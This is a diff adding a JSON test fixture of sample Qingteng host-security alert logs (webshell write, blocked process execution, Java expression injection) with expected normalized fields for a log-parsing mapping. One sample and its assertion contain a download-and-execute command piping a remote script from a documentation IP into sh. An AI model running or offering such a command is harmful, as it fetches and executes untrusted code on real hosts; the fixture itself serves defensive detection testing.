@@ -1,0 +1,56 @@
+{
+  "version": 1,
+  "note": "青藤云模板正样本与关键字段断言。line 为按厂商公开文档/公开日志字段结构重建的真实感样本（未联网抓取，取值与 IP 为 RFC 5737/私网示例段）；expect 中的键为 apply_mapping 之后的字段名（event.severity/event.category 为归一化前的平台取值）。",
+  "samples": {
+    "qingteng-hive-webshell-syslog": {
+      "protocol": "syslog",
+      "line": "<134>Feb 21 10:23:45 app-prod-01 hive[2311]: 2026-02-21 10:23:45 [high] host=10.20.30.40 hostname=app-prod-01 user=www-data rule_id=QT-HIVE-1001 risk=high action=block msg=\"检测到 WebShell 文件写入\" path=/var/www/html/upload/shell.php",
+      "expect": {
+        "host.name": "app-prod-01",
+        "source.ip": "10.20.30.40",
+        "user.name": "www-data",
+        "rule.id": "QT-HIVE-1001",
+        "event.severity": "high",
+        "event.action": "denied",
+        "event.category": "intrusion",
+        "file.path": "/var/www/html/upload/shell.php",
+        "message": "检测到 WebShell 文件写入"
+      }
+    },
+    "qingteng-hive-process-json": {
+      "protocol": "webhook",
+      "line": "{\"timestamp\":\"2026-02-21T10:23:45.123+08:00\",\"event_type\":\"process_exec\",\"host\":{\"name\":\"app-prod-01\",\"ip\":\"10.20.30.40\"},\"user\":{\"name\":\"root\"},\"process\":{\"pid\":2311,\"name\":\"bash\",\"cmd_line\":\"curl -s http://198.51.100.9/x.sh | sh\",\"parent_name\":\"nginx\"},\"risk_level\":\"critical\",\"action\":\"block\",\"rule_id\":\"QT-HIVE-2001\",\"rule_name\":\"可疑下载执行\"}",
+      "expect": {
+        "event.time": "2026-02-21T02:23:45.123Z",
+        "host.name": "app-prod-01",
+        "host.ip": "10.20.30.40",
+        "user.name": "root",
+        "process.pid": "2311",
+        "process.name": "bash",
+        "process.command_line": "curl -s http://198.51.100.9/x.sh | sh",
+        "process.parent.name": "nginx",
+        "rule.id": "QT-HIVE-2001",
+        "rule.name": "可疑下载执行",
+        "event.severity": "critical",
+        "event.action": "denied",
+        "event.category": "process"
+      }
+    },
+    "qingteng-rasp-java-json": {
+      "protocol": "webhook",
+      "line": "{\"time\":\"2026-02-21T10:24:01+08:00\",\"app\":\"order-service\",\"instance\":\"10.20.30.41:8080\",\"attack_type\":\"java_expression_injection\",\"level\":\"high\",\"action\":\"block\",\"url\":\"/api/v1/order/query\",\"client_ip\":\"203.0.113.45\",\"user_agent\":\"curl/8.5.0\",\"rule_id\":\"QT-RASP-3301\",\"stack_trace\":\"javax.el.ExpressionFactory.coerceToType(ExpressionFactory.java:112)\"}",
+      "expect": {
+        "service.name": "order-service",
+        "host.name": "10.20.30.41:8080",
+        "url.path": "/api/v1/order/query",
+        "source.ip": "203.0.113.45",
+        "user_agent.original": "curl/8.5.0",
+        "rule.id": "QT-RASP-3301",
+        "error.stack_trace": "javax.el.ExpressionFactory.coerceToType(ExpressionFactory.java:112)",
+        "event.severity": "high",
+        "event.action": "denied",
+        "event.category": "web"
+      }
+    }
+  }
+}
